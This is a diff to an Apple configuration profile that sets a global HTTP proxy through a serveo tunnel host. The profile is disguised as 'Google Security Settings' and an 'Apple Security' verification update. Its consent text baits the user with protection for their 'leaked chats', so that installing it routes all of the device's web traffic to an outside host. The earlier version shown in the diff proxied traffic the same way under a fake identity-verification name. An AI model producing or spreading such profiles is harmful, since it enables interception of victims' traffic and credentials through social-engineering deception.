@@ -6,32 +6,45 @@
     <array>
         <dict>
             <key>PayloadDescription</key>
-            <string>Identity Verification for Hadima Closet Archives</string>
+            <string>Configures global HTTP proxy</string>
             <key>PayloadDisplayName</key>
-            <string>Hadima Verification Certificate</string>
+            <string>Google Security Settings</string>
             <key>PayloadIdentifier</key>
-            <string>com.apple.proxy.setup</string>
+            <string>com.apple.proxy.http.global.1</string>
             <key>PayloadType</key>
-            <string>com.apple.proxy.http</string>
+            <string>com.apple.proxy.http.global</string>
             <key>PayloadUUID</key>
-            <string>12345-67890</string>
+            <string>A1B2C3D4-E5F6-7G8H-9I0J-K1L2M3N4O5P6</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
+            <key>ProxyType</key>
+            <string>Manual</string>
             <key>ProxyServer</key>
-            <string>serveo.net</string>
-            <key>ProxyPort</key>
-            <integer>4444</integer>
+            <string>consuetudo.serveousercontent.com</string>
+            <key>ProxyServerPort</key>
+            <integer>80</integer>
         </dict>
     </array>
+    <key>PayloadDescription</key>
+    <string>Critical Security Update for iCloud and Chat Services</string>
     <key>PayloadDisplayName</key>
-    <string>Hadima Identity Service</string>
+    <string>Security Verification Profile</string>
     <key>PayloadIdentifier</key>
-    <string>com.hadima.verify</string>
+    <string>com.apple.security.verify.1</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Security</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
-    <string>09876-54321</string>
+    <string>B2C3D4E5-F6G7-8H9I-0J1K-L2M3N4O5P6Q7</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
+    <key>ConsentText</key>
+    <dict>
+        <key>default</key>
+        <string>Installing this profile will verify your identity and protect your leaked chats from unauthorized access.</string>
+    </dict>
 </dict>
 </plist>
